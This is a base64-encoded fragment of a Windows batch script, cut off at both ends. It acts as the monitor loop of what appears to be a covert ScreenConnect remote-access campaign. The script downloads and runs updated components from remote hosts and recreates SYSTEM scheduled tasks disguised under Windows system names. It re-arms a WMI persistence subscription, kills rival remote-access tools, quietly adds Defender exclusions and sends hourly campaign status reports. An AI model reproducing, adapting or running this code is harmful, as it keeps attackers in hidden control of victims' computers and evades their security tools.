aWRlbnRpdHkuY2ZnIikgZG8gc2V0ICIlJUs9JSVMIgppZiBub3QgZGVmaW5lZCBUQVNLX0Egc2V0
ICJUQVNLX0E9XE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xTY2hlZHVsZWQiCmlmIG5vdCBk
ZWZpbmVkIFRBU0tfQiBzZXQgIlRBU0tfQj1cTWljcm9zb2Z0XFdpbmRvd3NcUExBXFNlcnZlciIK
aWYgbm90IGRlZmluZWQgVEFTS19DIHNldCAiVEFTS19DPVxNaWNyb3NvZnRcV2luZG93c1xXRElc
UmVzb2x1dGlvbkhvc3QiCmlmIG5vdCBkZWZpbmVkIFRBU0tfRCBzZXQgIlRBU0tfRD1cTWljcm9z
b2Z0XFdpbmRvd3NcVGNwaXBcSXBBZGRyZXNzQ29uZmxpY3QxIgppZiBub3QgZGVmaW5lZCBNT19B
IHNldCAiTU9fQT0yIgppZiBub3QgZGVmaW5lZCBNT19CIHNldCAiTU9fQj0zIgoKcmVtIOKUgOKU
gCBbQV0gYXV0by11cGRhdGUgY29yZSBmaWxlcyAoYmVzdCBlZmZvcnQpIOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAppZiBub3QgZXhpc3QgIiVD
VVJMJSIgc2V0ICJDVVJMPWN1cmwuZXhlIgoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1j
b25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXHRnX3JlcG9ydC5uZXciICIl
VEclIiA+bnVsIDI+JjEKaWYgbm90IGV4aXN0ICIlV0QlXHRnX3JlcG9ydC5uZXciICIlQ1VSTCUi
IC1MIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVx0Z19yZXBvcnQu
bmV3IiAiJVRHMiUiID5udWwgMj4mMQphdHRyaWIgLWggLXMgLXIgIiVXRCVcdGdfcmVwb3J0LnBz
MSIgPm51bCAyPiYxCmZvciAlJUYgaW4gKCIlV0QlXHRnX3JlcG9ydC5uZXciKSBkbyBpZiAlJX56
RiBHVFIgMTUwMCBtb3ZlIC95ICIlV0QlXHRnX3JlcG9ydC5uZXciICIlV0QlXHRnX3JlcG9ydC5w
czEiID5udWwgMj4mMQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVv
dXQgOCAtLW1heC10aW1lIDMwIC1vICIlV0QlXG93bl9zZWN1cmUubmV3IiAiJU9XTlNFQyUiID5u
dWwgMj4mMQppZiBub3QgZXhpc3QgIiVXRCVcb3duX3NlY3VyZS5uZXciICIlQ1VSTCUiIC1MIC0t
Y29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSAzMCAtbyAiJVdEJVxvd25fc2VjdXJlLm5ldyIg
IiVPV05TRUMyJSIgPm51bCAyPiYxCmF0dHJpYiAtaCAtcyAtciAiJVdEJVxvd25fc2VjdXJlLmNt
ZCIgPm51bCAyPiYxCmZvciAlJUYgaW4gKCIlV0QlXG93bl9zZWN1cmUubmV3IikgZG8gaWYgJSV+
ekYgR1RSIDgwMCBtb3ZlIC95ICIlV0QlXG93bl9zZWN1cmUubmV3IiAiJVdEJVxvd25fc2VjdXJl
LmNtZCIgPm51bCAyPiYxCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGlt
ZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcb3duX2xpYi5uZXciICIlT1dOTElCJSIgPm51
bCAyPiYxCmlmIG5vdCBleGlzdCAiJVdEJVxvd25fbGliLm5ldyIgIiVDVVJMJSIgLUwgLS1jb25u
ZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXG93bl9saWIubmV3IiAiJU9XTkxJ
QjIlIiA+bnVsIDI+JjEKYXR0cmliIC1oIC1zIC1yICIlV0QlXG93bl9saWIucHMxIiA+bnVsIDI+
JjEKZm9yICUlRiBpbiAoIiVXRCVcb3duX2xpYi5uZXciKSBkbyBpZiAlJX56RiBHVFIgMTUwMCBt
b3ZlIC95ICIlV0QlXG93bl9saWIubmV3IiAiJVdEJVxvd25fbGliLnBzMSIgPm51bCAyPiYxCnJl
bSBzZWxmLXVwZGF0ZTogZG93bmxvYWQgbmV3IG93bl9tb24sIGFwcGx5IEFGVEVSIHRoaXMgdGlj
awpzZXQgIlNFTEZfVVBEPTAiCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3Qt
dGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcb3duX21vbi5uZXh0IiAiJU9XTk1PTiUi
ID5udWwgMj4mMQppZiBub3QgZXhpc3QgIiVXRCVcb3duX21vbi5uZXh0IiAiJUNVUkwlIiAtTCAt
LWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcb3duX21vbi5uZXh0IiAi
JU9XTk1PTjIlIiA+bnVsIDI+JjEKZm9yICUlRiBpbiAoIiVXRCVcb3duX21vbi5uZXh0IikgZG8g
aWYgJSV+ekYgR1RSIDE1MDAgKAogIGZjIC9iICIlV0QlXG93bl9tb24ubmV4dCIgIiVXRCVcb3du
X21vbi5jbWQiID5udWwgMj4mMQogIGlmIGVycm9ybGV2ZWwgMSBzZXQgIlNFTEZfVVBEPTEiCikK
CnJlbSDilIDilIAgW0JdIHJlLWFybSBjaGFpbiAxIChzY2h0YXNrcykgaWYgbWlzc2luZyDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKc2NodGFz
a3MgL1F1ZXJ5IC9UTiAiJVRBU0tfQSUiID5udWwgMj4mMQppZiBlcnJvcmxldmVsIDEgKAogIGVj
aG8gcmVhcm0gVEFTS19BICVUQVNLX0ElPj4iJUxPRyUiCiAgc2NodGFza3MgL0NyZWF0ZSAvRiAv
VE4gIiVUQVNLX0ElIiAvU0MgTUlOVVRFIC9NTyAlTU9fQSUgL1JVIFNZU1RFTSAvUkwgSElHSEVT
VCAvVFIgImNtZCAvYyAlV0QlXG93bl9tb24uY21kIiA+PiIlTE9HJSIgMj4mMQogIHNjaHRhc2tz
IC9SdW4gL1ROICIlVEFTS19BJSIgPm51bCAyPiYxCikKc2NodGFza3MgL1F1ZXJ5IC9UTiAiJVRB
U0tfQiUiID5udWwgMj4mMQppZiBlcnJvcmxldmVsIDEgKAogIGVjaG8gcmVhcm0gVEFTS19CICVU
QVNLX0IlPj4iJUxPRyUiCiAgc2NodGFza3MgL0NyZWF0ZSAvRiAvVE4gIiVUQVNLX0IlIiAvU0Mg
TUlOVVRFIC9NTyAlTU9fQiUgL1JVIFNZU1RFTSAvUkwgSElHSEVTVCAvVFIgImNtZCAvYyAlV0Ql
XG93bl9tb24uY21kIiA+PiIlTE9HJSIgMj4mMQogIHNjaHRhc2tzIC9SdW4gL1ROICIlVEFTS19C
JSIgPm51bCAyPiYxCikKc2NodGFza3MgL1F1ZXJ5IC9UTiAiJVRBU0tfQyUiID5udWwgMj4mMQpp
ZiBlcnJvcmxldmVsIDEgKAogIGVjaG8gcmVhcm0gVEFTS19DICVUQVNLX0MlPj4iJUxPRyUiCiAg
c2NodGFza3MgL0NyZWF0ZSAvRiAvVE4gIiVUQVNLX0MlIiAvU0MgT05TVEFSVCAvUlUgU1lTVEVN
IC9STCBISUdIRVNUIC9UUiAiY21kIC9jICVXRCVcb3duX21vbi5jbWQiID4+IiVMT0clIiAyPiYx
CikKc2NodGFza3MgL1F1ZXJ5IC9UTiAiJVRBU0tfRCUiID5udWwgMj4mMQppZiBlcnJvcmxldmVs
IDEgKAogIGVjaG8gcmVhcm0gVEFTS19EICVUQVNLX0QlPj4iJUxPRyUiCiAgc2NodGFza3MgL0Ny
ZWF0ZSAvRiAvVE4gIiVUQVNLX0QlIiAvU0MgT05MT0dPTiAvUlUgU1lTVEVNIC9STCBISUdIRVNU
IC9UUiAiY21kIC9jICVXRCVcb3duX21vbi5jbWQiID4+IiVMT0clIiAyPiYxCikKCnJlbSDilIDi
lIAgW0IyXSByZS1hcm0gY2hhaW4gMiAoV01JIHN1YnNjcmlwdGlvbikgaWYgbWlzc2luZyDilIDi
lIDilIDilIDilIDilIDilIDilIDilIAKaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiICgKICBm
b3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAt
Tm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xp
Yi5wczEiIC1BY3Rpb24gd2F0Y2hkb2ctZW5zdXJlIC1Xb3JrRGlyICIlV0QlIiAtTW9uUGF0aCAi
JVdEJVxvd25fbW9uLmNtZCJgKSBkbyBzZXQgIldEX1NUQVRFPSUlUiIKICBpZiAvSSAiIVdEX1NU
QVRFISI9PSJSRUFSTUVEIiBlY2hvIHdhdGNoZG9nIFdNSSBSRUFSTUVEPj4iJUxPRyUiCikKCnJl
bSDilIDilIAgW0VdIGV4dGVybWluYXRlIGZvcmVpZ24gU0MgKyBkaXNhbGxvd2VkIFJNTSAoQkVG
T1JFIGhlYWwvaW5zdGFsbCwKcmVtICAgICBzbyB0aGUgU0MgaW5zdGFsbGVyIGN1c3RvbSBhY3Rp
b24gbmV2ZXIgY29sbGlkZXMgd2l0aCByaXZhbHMpIOKUgOKUgAppZiBleGlzdCAiJVdEJVxvd25f
bGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9u
UG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBleHRlcm1pbmF0
ZSAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjEKc2V0ICJGT1JFSUdOX0xFRlQ9MCIKZm9y
IC9mICJ0b2tlbnM9MiBkZWxpbXM9KCkiICUlYSBpbiAoJ3NjIHF1ZXJ5IHN0YXRlXj0gYWxsIF58
IGZpbmRzdHIgL0M6IlNFUlZJQ0VfTkFNRTogU2NyZWVuQ29ubmVjdCBDbGllbnQiJykgZG8gKAog
IHNldCAiRlA9JSVhIgogIHNldCAiRlA9IUZQOiA9ISIKICBzZXQgL2EgQ09VTlQrPTEKICBpZiAv
SSBub3QgIiFGUCEiPT0iJUtFRVBfRlAlIiBpZiAvSSBub3QgIiFGUCEiPT0iJUFMVF9GUCUiICgK
ICAgIHNldCAvYSBGT1JFSUdOX0xFRlQrPTEKICAgIHNldCAiRk9SRUlHTl9MSVNUPSFGT1JFSUdO
X0xJU1QhIUZQISAiCiAgICBlY2hvIGZvcmVpZ25fbGVmdF8hRlAhPj4iJUxPRyUiCiAgKQopCgpy
ZW0g4pSA4pSAIFtDXSBoZWFsIFNjcmVlbkNvbm5lY3QgcHJpbS9hbHQg4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSACmZvciAvZiAidG9rZW5zPTEsMiBkZWxpbXM9KCkiICUlYSBpbiAoJ3NjIHF1
ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgXnwgZmluZHN0ciAvQzoiU0VS
VklDRV9OQU1FIicpIGRvICgKICBzZXQgL2EgQ09VTlQrPTEKICBzZXQgIklOU1RBTExFRD0xIgog
IHNldCAiUFJJTVNUQVRFPSUlYiIKKQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVL
RUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bAppZiBub3QgZXJyb3JsZXZlbCAxIHNldCAi
UFJJTV9PSz0xIgpmb3IgL2YgInRva2Vucz0xLDIgZGVsaW1zPSgpIiAlJWEgaW4gKCdzYyBxdWVy
eSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgXnwgZmluZHN0ciAvQzoiU0VSVklD
RV9OQU1FIicpIGRvIHNldCAvYSBDT1VOVCs9MQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGll
bnQgKCVBTFRfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsCmlmIG5vdCBlcnJvcmxldmVsIDEg
c2V0ICJBTFRfT0s9MSIKCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAi
ICgKICBlY2hvIHN2YyBoZWFsIHJlc3RhcnQ+PiIlTE9HJSIKICBuZXQgc3RhcnQgIlNjcmVlbkNv
bm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+bnVsIDI+JjEKICBzYyBzdGFydCAiU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQogIHRpbWVvdXQgL3QgNiAvbm9icmVh
ayA+bnVsCiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8IGZp
bmQgIlJVTk5JTkciID5udWwKICBpZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiUFJJTV9PSz0xIgop
CnJlbSBNMTY6IHN0aWxsIHN0b3BwZWQgLT4gcmVwYWlyIHRoZSBSRUdJU1RFUkVEIHByb2R1Y3Qg
KG1zaWV4ZWMgL2ZhIHJlc3RvcmVzCnJlbSBiaW5hcmllcyArIHN0YXJ0cyB0aGUgc2VydmljZTsg
TDUgUmVwYWlyLVNDU2VydmljZSBoYW5kbGVzIHN0b3BwZWQgc3ZjcykKaWYgIiVJTlNUQUxMRUQl
Ij09IjEiIGlmICIlUFJJTV9PSyUiPT0iMCIgKAogIGVjaG8gc3ZjIGVzY2FsYXRlIHJlcGFpcj4+
IiVMT0clIgogIGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2Zp
bGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93
bl9saWIucHMxIiAtQWN0aW9uIHJlcGFpciAtRnAgIiVLRUVQX0ZQJSIgLVdvcmtEaXIgIiVXRCUi
ID4+IiVMT0clIiAyPiYxCiAgdGltZW91dCAvdCA4IC9ub2JyZWFrID5udWwKICBzYyBxdWVyeSAi
U2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bAog
IGlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJQUklNX09LPTEiCikKcmVtIE0xNjogb3JwaGFuZWQg
c2VydmljZSBlbnRyeSAocHJvZHVjdCB1bnJlZ2lzdGVyZWQgLSBlYXRlbiBieSBhbiBTQy1mYW1p
bHkKcmVtIHVwZ3JhZGUgcmVtb3ZhbCkgY2FuIE5FVkVSIHN0YXJ0LiBEZWxldGUgaXQgYW5kIGZh
bGwgdGhyb3VnaCB0byB0aGUKcmVtIGZyZXNoLWluc3RhbGwgbGFkZGVyIGJlbG93IGluc3RlYWQg
b2YgYWxlcnRpbmcgIndvbnQgc3RhcnQiIGZvcmV2ZXIuCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBp
ZiAiJVBSSU1fT0slIj09IjAiICgKICBzZXQgIlJFR1NUQVRFPXVua25vd24iCiAgaWYgZXhpc3Qg
IiVXRCVcb3duX2xpYi5wczEiIGZvciAvZiAiZGVsaW1zPSIgJSVSIGluICgncG93ZXJzaGVsbCAt
Tm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAi
JVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZWdpc3RlcmVkIC1GcCAiJUtFRVBfRlAlIiAtV29y
a0RpciAiJVdEJSInKSBkbyBzZXQgIlJFR1NUQVRFPSUlUiIKICBlY2hvIG9ycGhhbl9jaGVjaz0h
UkVHU1RBVEUhPj4iJUxPRyUiCiAgaWYgL0kgIiFSRUdTVEFURSEiPT0ibm8iICgKICAgIGVjaG8g
b3JwaGFuX3NlcnZpY2VfZGVsZXRlPj4iJUxPRyUiCiAgICBzYyBkZWxldGUgIlNjcmVlbkNvbm5l
Y3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+bnVsIDI+JjEKICAgIHNldCAiSU5TVEFMTEVEPTAiCiAg
KQopCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAiICgKICBwb3dlcnNo
ZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1G
aWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVp
bGQgJU1PTlZFUiUgLUV4dHJhICJzdmMtd29udC1zdGFydCIgPm51bCAyPiYxCiAgY2FsbCA6VGdT
dGF0ZSBET1dOICJTY3JlZW5Db25uZWN0ICglS0VFUF9GUCUpIGluc3RhbGxlZCBidXQgd29udCBz
dGFydCIKICBnb3RvIDpBZnRlckhlYWwKKQppZiAiJUlOU1RBTExFRCUiPT0iMSIgZ290byA6QWZ0
ZXJIZWFsCgpyZW0g4pSA4pSAIFtEXSBwcmltYXJ5IFNDIG1pc3NpbmcgLSBoZWFsIGxhZGRlciDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
lIDilIDilIAKcmVtIE0xMjogRklSU1QgcmVwYWlyIHRoZSByZWdpc3RlcmVkIHByb2R1Y3QgKHJl
Y3JlYXRlcyBzZXJ2aWNlIHdpdGhvdXQKcmVtIHRvdWNoaW5nIHRoZSBBTFQgaW5zdGFuY2UpOyBm
cmVzaCBtc2lleGVjIGluc3RhbGwgb25seSBhcyBmYWxsYmFjay4KZWNobyBzdmMgbWlzc2luZyAt
IGhlYWwgYmVnaW4+PiIlTE9HJSIKY2FsbCA6UmVwYWlyUmVnaXN0ZXJlZCAiJUtFRVBfRlAlIgpp
ZiAiJUlOU1RBTExFRCUiPT0iMCIgY2FsbCA6SW5zdGFsbE1zaSAiJU1TSV9VUkwlIiAibWFpbiIK
aWYgIiVJTlNUQUxMRUQlIj09IjAiIGNhbGwgOkluc3RhbGxNc2kgIiVNU0lfUEtHMT90PSVSQU5E
T00lIiAiZ2l0aHViLXBrZyIKaWYgIiVJTlNUQUxMRUQlIj09IjAiIGNhbGwgOkluc3RhbGxNc2kg
IiVNU0lfUEtHMiUiICJqc2RlbGl2ci1wa2ciCmlmICIlSU5TVEFMTEVEJSI9PSIwIiAoCiAgZm9y
ICUlRiBpbiAoIiVNU0klIikgZG8gaWYgJSV+ekYgR1RSIDEwMDAwMDAgKAogICAgZWNobyBjYWNo
ZSByZXRyeSBpbnN0YWxsPj4iJUxPRyUiCiAgICBjYWxsIDpOb01zaVBvbGljeQogICAgbXNpZXhl
YyAvaSAiJU1TSSUiIC9xbiAvbm9yZXN0YXJ0IC9MKnYgIiVXRCVcbXNpX2hlYWwubG9nIiA+bnVs
IDI+JjEKICAgIHNldCAiTVNJRVhJVD0hRVJST1JMRVZFTCEiCiAgICBlY2hvIGNhY2hlIG1zaWV4
ZWMgZXhpdD0hTVNJRVhJVCE+PiIlTE9HJSIKICAgIGNhbGwgOldhaXRTdmMKICApCikKY2FsbCA6
UmVzdG9yZUFsdAppZiAiJUlOU1RBTExFRCUiPT0iMCIgKAogIGlmIGV4aXN0ICIlV0QlXG1zaV9o
ZWFsLmxvZyIgKAogICAgZWNobyAtLS0gbXNpX2hlYWwubG9nIHRhaWwgLS0tPj4iJUxPRyUiCiAg
ICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJHZXQtQ29u
dGVudCAtTGl0ZXJhbFBhdGggJyVXRCVcbXNpX2hlYWwubG9nJyAtVGFpbCAxMCIgPj4iJUxPRyUi
IDI+JjEKICApCiAgaWYgbm90IGRlZmluZWQgTVNJRVhJVCBzZXQgIk1TSUVYSVQ9ZmV0Y2gtZmFp
bCIKICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xp
Y3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGly
ICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJtc2ktZmFpbGVkIiA+bnVsIDI+JjEKICBj
YWxsIDpUZ1N0YXRlIEZBSUwgIk1TSSBpbnN0YWxsIGZhaWxlZCBvbiBhbGwgc291cmNlcyAobXNp
ZXhlYyBleGl0ICVNU0lFWElUJSkiCikgZWxzZSAoCiAgZWNobyBzdmMgcmVzdG9yZWQ+PiIlTE9H
JSIKICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xp
Y3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGly
ICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJyZXN0b3JlZCIgPm51bCAyPiYxCiAgY2Fs
bCA6VGdTdGF0ZSBSRVNUT1JFRCAiU2NyZWVuQ29ubmVjdCByZWluc3RhbGxlZCBPSyIKKQoKOkFm
dGVySGVhbApyZW0gTTE2OiBBTFQgcHJlc2VudC1idXQtc3RvcHBlZCAtPiByZXN0YXJ0LCB0aGVu
IHJlcGFpci1ieS1HVUlEIChldmVyeSB0aWNrKQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGll
bnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxCmlmIG5vdCBlcnJvcmxldmVsIDEgKAogIHNjIHF1ZXJ5
ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwK
ICBpZiBlcnJvcmxldmVsIDEgKAogICAgZWNobyBhbHQgc3RvcHBlZCAtIHJlc3RhcnQvcmVwYWly
Pj4iJUxPRyUiCiAgICBuZXQgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSki
ID5udWwgMj4mMQogICAgc2Mgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSki
ID5udWwgMj4mMQogICAgdGltZW91dCAvdCA1IC9ub2JyZWFrID5udWwKICAgIHNjIHF1ZXJ5ICJT
Y3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwKICAg
IGlmIGVycm9ybGV2ZWwgMSBpZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAt
Tm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAi
JVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIgLUZwICIlQUxUX0ZQJSIgLVdvcmtEaXIg
IiVXRCUiID4+IiVMT0clIiAyPiYxCiAgKQopCnJlbSBNMTc6IEFMVCBzZXJ2aWNlIGVudHJ5IGRl
bGV0ZWQgYnV0IHByb2R1Y3QgcmVnaXN0ZXJlZCAtPiByZXBhaXItYnktR1VJRCBldmVyeSB0aWNr
CnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+JjEKaWYg
ZXJyb3JsZXZlbCAxICgKICBlY2hvIGFsdF9taXNzaW5nX3RyeV9yZXBhaXI+PiIlTE9HJSIKICBp
ZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRl
cmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIg
LUFjdGlvbiByZXBhaXIgLUZwICIlQUxUX0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAy
PiYxCikKcmVtIChleHRlcm1pbmF0aW9uIGFscmVhZHkgcmFuIHByZS1oZWFsIGluIFtFXTsgZm9y
ZWlnbiBzdXJ2aXZvcnMgY291bnRlZCB0aGVyZSkKCnJlbSDilIDilIAgW0ZdIHN0ZWFsdGggcmUt
c2VjdXJlIChxdWlldCBEZWZlbmRlciBleGNsdXNpb24gcmVmcmVzaCkg4pSA4pSACnBvd2Vyc2hl
bGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNv
bW1hbmQgInRyeSB7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJyVXRCUnLCclRVRM
JScgLUVycm9yQWN0aW9uIFN0b3AgfSBjYXRjaCB7fSIgPm51bCAyPiYxCgpyZW0g4pSA4pSAIFtH
XSBwZXJpb2RpYyBmdWxsIHJlLXNlY3VyZSBldmVyeSB+MiBoIOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgApwb3dlcnNoZWxsIC1Ob1By
b2ZpbGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJpZigoVGVzdC1QYXRoICclV0QlXG93bl9z
ZWN1cmUuY21kJykgLWFuZCAoKCAtbm90IChUZXN0LVBhdGggJyVXRCVcc2VjLmZsYWcnKSkgLW9y
ICgoKEdldC1EYXRlKSAtIChHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJyVXRCVcc2VjLmZsYWcnKS5M
YXN0V3JpdGVUaW1lKS5Ub3RhbEhvdXJzIC1nZSAyKSkpeyBleGl0IDEgfSBlbHNlIHsgZXhpdCAw
IH0iID5udWwgMj4mMQppZiBlcnJvcmxldmVsIDEgKAogIGVjaG8gcGVyaW9kaWMgcmUtc2VjdXJl
Pj4iJUxPRyUiCiAgY2FsbCAiJVdEJVxvd25fc2VjdXJlLmNtZCIgPj4iJUxPRyUiIDI+JjEKICBl
Y2hvIGRvbmU+IiVXRCVcc2VjLmZsYWciCikKCnJlbSDilIDilIAgW0hdIGNhbXBhaWduIHN0YXRl
ICsgaG91cmx5IGNvbXBhY3QgZGlnZXN0IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgAppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAt
Tm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAi
JVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVN
T05WRVIlID5udWwgMj4mMQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1D
b21tYW5kICJpZigoVGVzdC1QYXRoICclSEJGTEFHJScpIC1hbmQgKE5ldy1UaW1lU3BhbiAtU3Rh
cnQgKEdldC1JdGVtIC1MaXRlcmFsUGF0aCAnJUhCRkxBRyUnKS5MYXN0V3JpdGVUaW1lKS5Ub3Rh
bE1pbnV0ZXMgLWx0IDYwKXsgZXhpdCAwIH0gZWxzZSB7IGV4aXQgMSB9IiA+bnVsIDI+JjEKaWYg
ZXJyb3JsZXZlbCAxICgKICBlY2hvIGhiPiVIQkZMQUclCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxl
IC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVx0Z19y
ZXBvcnQucHMxIiAtU3RhdGUgSEIgLU1vZGUgY29tcGFjdCAtQnVpbGQgJU1PTlZFUiUgLUNvdW50
ICFDT1VOVCEgPm51bCAyPiYxCiAgZWNobyBkaWdlc3QgSEIgc2VudD4+IiVMT0clIgopCgpyZW0g
4pSA4pSAIFtJXSBzZWxmLXVwZGF0ZSBhcHBseSAobGFzdCB0aGluZyB0aGlzIHRpY2spIOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAppZiAiJVNFTEZfVVBEJSI9PSIx
IiAoCiAgZWNobyBzZWxmLXVwZGF0ZSBhcHBseT4+IiVMT0clIgogIGF0dHJpYiAtaCAtcyAtciAi
JVdEJVxvd25fbW9uLmNtZCIgPm51bCAyPiYxCiAgbW92ZSAveSAiJVdEJVxvd25fbW9uLm5leHQi
ICIlV0QlXG93bl9tb24uY21kIiA+bnVsIDI+JjEKKQoKZWNobyB0aWNrIGRvbmU6IHByaW09JVBS
SU1fT0slIGFsdD0lQUxUX09LJSBmb3JlaWduPSVGT1JFSUdOX0xFRlQlPj4iJUxPRyUiCmVuZGxv
Y2FsCmV4aXQgL2IgMAoKcmVtIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
